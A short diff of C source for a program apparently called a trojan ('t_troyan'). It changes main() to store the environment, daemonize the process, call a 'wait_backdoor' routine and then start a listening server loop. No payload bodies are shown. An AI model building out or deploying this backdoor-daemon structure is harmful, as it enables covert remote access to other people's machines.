@@ -42,9 +42,12 @@ int ft_payload(t_troyan *shield)
     return(0);
 }
 
-int main()
+int main(int argc, char **argv, char **env)
 {
     t_troyan    *shield;
+
+    (void)argc;
+    (void)argv;
 
     shield = malloc(sizeof(t_troyan));
     if (!shield)
@@ -52,6 +55,7 @@ int main()
     memset(shield, 0, sizeof(t_troyan));
     init_signal();
 
+    shield->env = env;
     shield->pwd = getpwuid(getuid());
     if (!shield->pwd)
     {
@@ -71,11 +75,24 @@ int main()
         return (1);
     }
 
+    if (ft_create_daemon(shield))
+    {
+        free(shield);
+        return (1);
+    }
+
+    if (wait_backdoor())
+    {
+        free(shield);
+        return (1);
+    }
+
     if (init_servsocket(shield))
     {
         free(shield);
         return (1);
     }
+
     loop_server(shield);
     close(shield->socketfd);
     free(shield);
